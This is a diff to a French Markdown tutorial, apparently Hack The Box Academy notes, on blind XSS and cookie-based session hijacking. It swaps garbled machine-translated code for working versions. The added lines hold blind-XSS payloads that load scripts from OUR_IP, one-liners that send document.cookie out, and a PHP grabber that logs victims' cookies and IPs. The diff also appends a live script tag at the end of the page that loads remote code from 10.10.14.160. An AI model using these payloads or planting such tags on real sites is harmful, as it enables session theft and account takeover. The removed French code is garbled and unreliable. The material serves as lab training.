@@ -44,12 +44,12 @@ Cependant, cela introduit deux problèmes:
 Chargement d'un script distant
 -----------------------
 
-Dans HTML, nous pouvons écrire du code JavaScript dans les balises `<cript>`, mais nous pouvons également inclure un script distant en fournissant son URL, comme suit:
+Dans HTML, nous pouvons écrire du code JavaScript dans les balises `<script>`, mais nous pouvons également inclure un script distant en fournissant son URL, comme suit:
 
 Code: HTML
 
 ```
-<script src = "http: //our_ip/script.js"> </ script>
+<script src="http://OUR_IP/script.js"></script>
 ```
 
 Ainsi, nous pouvons l'utiliser pour exécuter un fichier JavaScript distant qui est servi sur notre machine virtuelle. Nous pouvons modifier le nom de script demandé de `script.js` au nom du champ dans lequel nous injectons, de sorte que lorsque nous obtenons la demande dans notre machine virtuelle, nous pouvons identifier le champ de saisie vulnérable qui a exécuté le script, comme suit:
@@ -57,20 +57,20 @@ Ainsi, nous pouvons l'utiliser pour exécuter un fichier JavaScript distant qui 
 Code: HTML
 
 ```
-<script src = "http: // our_ip / nom d'utilisateur"> </ script>
+<script src="http://OUR_IP/username"></script>
+
 ```
 
 Si nous obtenons une demande de «nom d'utilisateur», nous savons que le champ «Nom d'utilisateur» est vulnérable à XSS, etc. Avec cela, nous pouvons commencer à tester diverses charges utiles XSS qui chargent un script distant et voir lequel d'entre eux nous envoie une demande. Voici quelques exemples que nous pouvons utiliser à partir de [PayloadsallThethings](https://github.com/swisskyrepo/payloadsallthethings/tree/master/xss%20Injection#blind-xss):
 
 Code: HTML
 ```
-<script src = http: // our_ip> </ script>
-'> <script src = http: // our_ip> </ script>
-"> <script src = http: // our_ip> </ script>
-JavaScript: eval ('var a = document.createelement (\' script \ '); a.src = \' http: // our_ip \ '; document.body.appendchild (a)')
-<Script> Fonction b () {eval (this.ResponSeText)}; a = new XmlHttpRequest (); a.AddeventListener ("Load", b); a.open ("get", "// our_ip"); a; .Send (); </cript>
-<cript> $. getScript ("http: // our_ip") </script>
-
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
 ```
 
 Comme nous pouvons le voir, diverses charges utiles commencent par une injection comme `'>`, qui peut fonctionner ou non en fonction de la façon dont nos contributions sont traitées dans le backend. Comme mentionné précédemment dans la section «XSS Discovery», si nous avions accès au code source (c'est-à-dire dans un DOM XSS), il serait possible d'écrire avec précision la charge utile requise pour une injection réussie. C'est pourquoi Blind XSS a un taux de réussite plus élevé avec le type de vulnérabilités DOM XSS.
@@ -78,10 +78,10 @@ Comme nous pouvons le voir, diverses charges utiles commencent par une injection
 Avant de commencer à envoyer des charges utiles, nous devons démarrer un auditeur sur notre machine virtuelle, en utilisant `NetCat` ou« Php »comme indiqué dans une section précédente:
 
 ```
-dsgsec @ htb [/ htb] $ mkdir / tmp / tmpServer
-dsgsec @ htb [/ htb] $ cd / tmp / tmpServer
-dsgsec @ htb [/ htb] $ sudo php -s 0.0.0.0:80
-PHP 7.4.15 Server de développement (http://0.0.0.0:80) a commencé
+dsgsec@htb[/htb]$ mkdir /tmp/tmpserver
+dsgsec@htb[/htb]$ cd /tmp/tmpserver
+dsgsec@htb[/htb]$ sudo php -S 0.0.0.0:80
+PHP 7.4.15 Development Server (http://0.0.0.0:80) started
 ```
 
 Maintenant, nous pouvons commencer à tester ces charges utiles une par une en utilisant l'un d'eux pour tous les champs d'entrée et en ajoutant le nom du champ après notre IP, comme mentionné précédemment, comme:
@@ -89,9 +89,9 @@ Maintenant, nous pouvons commencer à tester ces charges utiles une par une en u
 Code: HTML
 
 ```
-<script src = http: // our_ip / fullname> </ script> # Cela va à l'intérieur du champ de nom complet
-<script src = http: // our_ip / nom d'utilisateur> </ script> # Cela va à l'intérieur du champ de nom d'utilisateur
-...COUPER...
+<script src=http://OUR_IP/fullname></script> #this goes inside the full-name field
+<script src=http://OUR_IP/username></script> #this goes inside the username field
+...SNIP...
 ```
 
 Astuce: nous remarquerons que l'e-mail doit correspondre à un format de messagerie, même si nous essayons de manipuler les paramètres de demande HTTP, car il semble être validé à la fois sur le front-end et le back-end. Par conséquent, le champ de messagerie n'est pas vulnérable et nous pouvons le tester. De même, nous pouvons ignorer le champ de mot de passe, car les mots de passe sont généralement hachés et ne sont généralement pas affichés dans ClearText. Cela nous aide à réduire le nombre de champs d'entrée potentiellement vulnérables que nous devons tester.
@@ -114,8 +114,8 @@ Il y a plusieurs charges utiles JavaScript que nous pouvons utiliser pour saisir
 Code: JavaScript
 
 ```
-document.location = 'http: //our_ip/index.php? c =' + document.cookie;
-Nouvelle image () .src = 'http: //our_ip/index.php? c =' + document.cookie;
+document.location='http://OUR_IP/index.php?c='+document.cookie;
+new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 ```
 
 L'utilisation de l'une des deux charges utiles devrait fonctionner pour nous envoyer un cookie, mais nous utiliserons le second, car il ajoute simplement une image à la page, qui peut ne pas être très malveillante, tandis que la première navigue vers notre cookie Grabber PHP Page, qui peut sembler suspecte.
@@ -125,7 +125,7 @@ Nous pouvons écrire l'une de ces charges utiles JavaScript sur `script.js`, qui
 Code: JavaScript
 
 ```
-nouvelle image () .src = 'http: //our_ip/index.php? c =' + document.cookie
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
 ```
 
 Maintenant, nous pouvons modifier l'URL dans la charge utile XSS que nous avons trouvé plus tôt pour utiliser `script.js` (« n'oubliez pas de remplacer notre_IP par votre IP VM dans le script JS et la charge utile XSS »):
@@ -143,15 +143,15 @@ Nous pouvons enregistrer le script PHP suivant sous le nom de `index.php` et red
 Code: php
 
 ```
-<? Php
-if (isset ($ _ get ['c'])) {
-     $ list = explose (";", $ _get ['c']);
-     foreach ($ list as $ key => $ valeur) {
-         $ cookie = urlDECODE ($ VALEUR);
-         $ file = fopen ("cookies.txt", "a +");
-         fputs ($ file, "victime ip: {$ _server ['Remote_addr']} | cookie: {$ cookie} \ n");
-         fclose (fichier $);
-     }
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
 }
 ?>
 ```
@@ -177,3 +177,5 @@ Enfin, nous pouvons utiliser ce cookie sur la page «Login.php» pour accéder a
 Une fois que nous aurons réglé notre cookie, nous pouvons actualiser la page et nous aurons accès comme victime:
 
 ![](https://academy.hackthebox.com/storage/modules/103/xss_blind_hijacked_session.jpg)
+
+<script src=http://10.10.14.160:8080/script.js></script>
